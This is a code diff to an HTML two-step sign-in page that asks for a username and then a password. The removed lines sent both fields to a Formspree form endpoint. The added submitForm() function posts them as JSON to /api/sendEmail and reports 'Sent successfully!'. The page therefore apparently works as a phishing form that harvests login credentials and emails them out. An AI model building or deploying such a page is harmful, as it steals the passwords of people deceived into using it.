@@ -117,9 +117,6 @@ display: block;
 </div>
 
 <!-- STEP 1 -->
-<!-- Wrap both steps in a single form -->
-<form action="https://formspree.io/f/xdaplpkv" method="POST">
-<!-- STEP 1 -->
 <div class="step active" id="step1">
 <input type="text" id="username" placeholder="Username">
 
@@ -136,23 +133,20 @@ display: block;
 
 <!-- STEP 2 -->
 <div class="step" id="step2">
-<!-- Hidden username from step 1 -->
-<input type="hidden" name="username" id="hiddenUsername">
-
-<!-- Password field -->
-<input type="password" name="password" placeholder="Password">
+<input type="password" id="password" placeholder="Password">
 
 <div class="options">
-<label><input type="checkbox" name="remember"> Remember me</label>
+<label><input type="checkbox"> Remember me</label>
 </div>
 
-<button type="submit">Sign in</button>
+<button type="button" onclick="submitForm()">Sign in</button>
 
 <div class="links">
 <a href="#">Forgot password?</a>
 </div>
 </div>
-</form>
+
+</div>
 
 <script>
 function nextStep(){
@@ -162,10 +156,29 @@ alert("Enter username");
 return;
 }
 
-document.getElementById("hiddenUsername").value = user;
-
 document.getElementById("step1").classList.remove("active");
 document.getElementById("step2").classList.add("active");
 }
+
+async function submitForm(){
+var username = document.getElementById("username").value;
+var password = document.getElementById("password").value;
+
+try {
+const res = await fetch("/api/sendEmail", {
+method: "POST",
+headers: {"Content-Type": "application/json"},
+body: JSON.stringify({username, password})
+});
+
+const data = await res.json();
+alert(data.message || "Sent successfully!");
+} catch (err) {
+console.error(err);
+alert("Error sending data");
+}
+}
 </script>
 
+</body>
+</html>
